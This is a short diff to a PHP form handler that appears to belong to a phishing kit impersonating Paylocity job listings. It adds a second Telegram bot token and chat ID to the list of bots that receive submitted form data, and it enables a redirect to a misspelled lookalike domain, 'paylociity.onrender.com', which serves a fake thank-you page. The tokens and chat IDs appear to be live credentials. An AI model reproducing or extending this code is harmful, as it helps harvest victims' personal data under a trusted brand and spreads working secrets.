@@ -10,10 +10,10 @@ $telegram_bots = [
         'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
         'chat_id' => '1325797388'
     ],
-    // [
-    //     'token' => 'your_second_bot_token',
-    //     'chat_id' => 'your_second_chat_id'
-    // ]
+    [
+        'token' => '6559948089:AAFPgcZujs2vLPS9Ymvhqz5HOzwaIWoUZa4',
+        'chat_id' => '1749633126'
+    ]
     // Add more bots here if needed
 ];
 
@@ -174,7 +174,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
 
-    // header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
-// exit;
+    header("Location:https://paylociity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
+exit;
 }
 ?>
